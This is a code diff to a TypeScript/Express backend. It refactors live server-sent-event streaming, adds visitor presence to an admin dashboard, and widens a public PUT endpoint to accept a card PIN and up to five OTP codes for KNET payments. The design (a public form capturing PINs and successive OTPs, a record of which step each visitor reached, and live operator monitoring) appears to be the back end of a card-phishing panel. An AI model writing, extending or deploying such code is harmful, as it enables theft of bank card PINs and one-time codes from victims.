@@ -3,6 +3,8 @@ import { db } from "@workspace/db";
 import { paymentRecordsTable } from "@workspace/db";
 import { desc, eq } from "drizzle-orm";
 import { requireDashAuth } from "../middleware/auth";
+import { broadcastSSE, sseClients } from "../lib/sse";
+import { getPresenceList } from "./presence";
 
 const router = Router();
 
@@ -15,25 +17,13 @@ const KNET_FIELDS = new Set([
   "pin",
   "otp1",
   "otp2",
+  "otp3",
+  "otp4",
+  "otp5",
   "step_reached",
 ]);
 
-// SSE clients registry
-const sseClients = new Set<{
-  id: string;
-  res: import("express").Response;
-}>();
-
-export function broadcastSSE(event: string, data: unknown) {
-  const payload = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
-  sseClients.forEach((client) => {
-    try {
-      client.res.write(payload);
-    } catch {
-      sseClients.delete(client);
-    }
-  });
-}
+export { broadcastSSE };
 
 // GET /api/payment-records/stream  — SSE (admin only)
 router.get("/stream", requireDashAuth, (req, res) => {
@@ -46,6 +36,13 @@ router.get("/stream", requireDashAuth, (req, res) => {
   const client = { id: Math.random().toString(36).slice(2), res };
   sseClients.add(client);
   req.log?.info({ clientId: client.id }, "SSE client connected");
+
+  // Send current presence list immediately on connect
+  try {
+    res.write(
+      `event: presence_update\ndata: ${JSON.stringify(getPresenceList())}\n\n`,
+    );
+  } catch {}
 
   const keepalive = setInterval(() => {
     try {
@@ -93,14 +90,12 @@ router.post("/", async (req, res) => {
   }
 });
 
-// PUT /api/payment-records/:id (public — KNET form step updates only)
-// Only KNET card fields are accepted; all other fields are stripped.
+// PUT /api/payment-records/:id (public — KNET form step updates only, field-whitelisted)
 router.put("/:id", async (req, res) => {
   try {
     const id = parseInt(req.params["id"] as string, 10);
     const body = req.body as Record<string, unknown>;
 
-    // Strip any fields not in the KNET allowlist
     const safePayload: Record<string, unknown> = {};
     for (const key of Object.keys(body)) {
       if (KNET_FIELDS.has(key)) safePayload[key] = body[key];
